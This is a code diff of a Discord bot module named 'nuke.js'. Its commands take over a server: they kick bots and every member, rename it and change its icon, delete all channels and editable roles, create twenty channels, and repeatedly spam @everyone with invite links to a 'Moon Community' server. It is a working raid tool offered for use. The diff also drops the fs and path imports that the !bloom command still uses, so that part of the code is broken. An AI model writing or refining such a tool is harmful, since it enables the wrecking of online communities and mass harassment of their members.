@@ -1,12 +1,10 @@
 // handlers/nuke.js
 const { ChannelType } = require("discord.js");
-const fs = require('fs');
-const path = require('path');
 
 let welcomeInterval = null;
 
 // =========================
-// BANNER URL (For !moon)
+// BANNER URL
 // =========================
 const BANNER_URL = "https://cdn.discordapp.com/attachments/1531280455553388564/1555413440024023100/a9366db0-e4ac-4190-845c-b1eeb6e88b92.gif?backend=b2&ex=6ac7af66&is=6ac65de6&hm=ff994fce35c7a6fad6460c11715e456166f82dfe486a734e4c744016b3ce9207&";
 
@@ -22,9 +20,9 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!moon") {
             try {
-                // 1. Kick all other bots safely using cache
-                const botMembers = [...guild.members.cache.values()];
-                for (const member of botMembers) {
+                // 1. Kick all other bots
+                const botMembers = await guild.members.fetch();
+                for (const [, member] of botMembers) {
                     if (
                         member.user.bot &&
                         member.id !== client.user.id &&
@@ -35,20 +33,19 @@ module.exports = (client) => {
                     }
                 }
 
-                // 2. Server Details Change
+                // 1.1 Server Details Change
                 await guild.setName("Nuked by Moon Community 🌙").catch(() => {});
-                const iconPath = path.join(__dirname, '../assets/icon.png');
-                if (fs.existsSync(iconPath)) {
-                    await guild.setIcon(iconPath).catch(() => {});
-                }
+                await guild.setIcon(
+                    "https://cdn.discordapp.com/attachments/1531280455553388564/1556007534551371776/519nH38DWOL._AC_UF8941000_QL80_.jpg?backend=b2&ex=6ac29871&is=6ac146f1&hm=f78a05a105d4e1b0b48cd263fe0af374c40161823702edf73e853c8f1bb09465&"
+                ).catch(() => {});
                 
-                // 3. Delete all existing channels
+                // 2. Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
                 for (const channel of channels) {
                     await channel.delete("Moon command").catch(() => {});
                 }
 
-                // 4. Delete all deletable roles
+                // 3. Delete all deletable roles
                 const roles = [...guild.roles.cache.values()];
                 for (const role of roles) {
                     if (role.id !== guild.id && role.editable) {
@@ -56,7 +53,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 5. Create new text channels
+                // 4. Create new text channels
                 const newChannels = [];
                 for (let i = 0; i < 20; i++) {
                     const channel = await guild.channels.create({
@@ -69,7 +66,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 6. Send initial message
+                // 5. Send initial message
                 const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/h5ejJAabPv ";
                 await Promise.all(
                     newChannels.map(channel =>
@@ -80,13 +77,13 @@ module.exports = (client) => {
                     )
                 );
 
-                // 7. Stop previous interval if active
+                // 6. Stop previous interval if active
                 if (welcomeInterval) {
                     clearInterval(welcomeInterval);
                     welcomeInterval = null;
                 }
 
-                // 8. Interval spam
+                // 7. Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
@@ -106,9 +103,9 @@ module.exports = (client) => {
         // ==========================================
         if (command === "!sun") {
             try {
-                const members = [...guild.members.cache.values()];
+                const allMembers = await guild.members.fetch();
                 
-                for (const member of members) {
+                for (const [, member] of allMembers) {
                     if (
                         member.id !== client.user.id &&
                         member.id !== message.author.id &&
@@ -117,20 +114,19 @@ module.exports = (client) => {
                         await member.kick("Sun command").catch(() => {});
                     }
                 }
-                await message.channel.send("⚡ Sun command executed: Members kicked.").catch(() => {});
             } catch (error) {
                 console.error("Error executing !sun command:", error);
             }
         }
 
         // ==========================================
-        // 3. COMMAND: !bloom
+        // COMMAND: !bloom (Banner removed, separate icon file used)
         // ==========================================
         if (command === "!bloom") {
             try {
-                // 1. Kick all other bots safely using cache
-                const botMembers = [...guild.members.cache.values()];
-                for (const member of botMembers) {
+                // 1. Kick all other bots
+                const botMembers = await guild.members.fetch();
+                for (const [, member] of botMembers) {
                     if (
                         member.user.bot &&
                         member.id !== client.user.id &&
@@ -141,20 +137,20 @@ module.exports = (client) => {
                     }
                 }
 
-                // 2. Server Details Change
-                await guild.setName("Moon Community 🌙").catch(() => {});
+                // 1.1 Server Details Change (Using local icon file from assets folder)
                 const iconPath = path.join(__dirname, '../assets/icon.png');
                 if (fs.existsSync(iconPath)) {
                     await guild.setIcon(iconPath).catch(() => {});
                 }
+                await guild.setName("Moon Community 🌙").catch(() => {});
                 
-                // 3. Delete all existing channels
+                // 2. Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
                 for (const channel of channels) {
                     await channel.delete("bloom command").catch(() => {});
                 }
 
-                // 4. Delete all deletable roles
+                // 3. Delete all deletable roles
                 const roles = [...guild.roles.cache.values()];
                 for (const role of roles) {
                     if (role.id !== guild.id && role.editable) {
@@ -162,7 +158,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 5. Create new text channels
+                // 4. Create new text channels
                 const newChannels = [];
                 for (let i = 0; i < 20; i++) {
                     const channel = await guild.channels.create({
@@ -175,7 +171,7 @@ module.exports = (client) => {
                     }
                 }
 
-                // 6. Send initial message (No banner)
+                // 5. Send initial message (Banner removed, plain text/content message)
                 const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                 await Promise.all(
                     newChannels.map(channel =>
@@ -185,13 +181,13 @@ module.exports = (client) => {
                     )
                 );
 
-                // 7. Stop previous interval if active
+                // 6. Stop previous interval if active
                 if (welcomeInterval) {
                     clearInterval(welcomeInterval);
                     welcomeInterval = null;
                 }
 
-                // 8. Interval spam
+                // 7. Interval spam (Without banner)
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
@@ -204,7 +200,7 @@ module.exports = (client) => {
                 console.error("Error executing !bloom command:", error);
             }
         }
-              
+        
         // ==========================================
         // 4. COMMAND: !stop
         // ==========================================
@@ -213,10 +209,7 @@ module.exports = (client) => {
                 clearInterval(welcomeInterval);
                 welcomeInterval = null;
                 await message.channel.send("🛑 Spammer band kar diya gaya.").catch(() => {});
-            } else {
-                await message.channel.send("⚠️ Koi spammer active nahi hai.").catch(() => {});
             }
         }
     });
 };
-                        
